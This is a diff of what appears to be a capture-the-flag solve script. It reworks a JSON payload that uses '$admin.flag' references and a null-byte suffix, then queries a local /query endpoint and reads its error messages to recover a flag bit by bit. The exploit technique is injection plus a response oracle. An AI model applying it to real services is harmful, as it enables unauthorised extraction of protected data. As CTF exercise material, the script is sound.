@@ -5,16 +5,16 @@ from functools import reduce
 
 def generate_config(flag):
     return {
-        'games': [
+        'queries': [
             {
                 'name': 'merge_to',
-                'settings': {},
-                'version': '$admin.flag'
+                'auth': {},
+                'data': '$admin.flag'
             },
             {
                 'name': 'merge_to',
-                'settings': '$games',
-                'version': f'{flag}\0flag'
+                'auth': '$operations',
+                'data': f'{flag}\0flag'
             }
         ]
     }
@@ -30,7 +30,7 @@ def main():
     flag = ''
     while not flag or flag[-1] != '}':
         flag = bits_to_str(flag_bits + [1])
-        out = requests.get('http://localhost:5000/run', json=generate_config(flag)).content.decode()
+        out = requests.get('http://localhost:5000/query', json=generate_config(flag)).content.decode()
         if 'You will not use the flag' in out:
             flag_bits.append(0)
         elif 'You will not even reach the flag' in out:
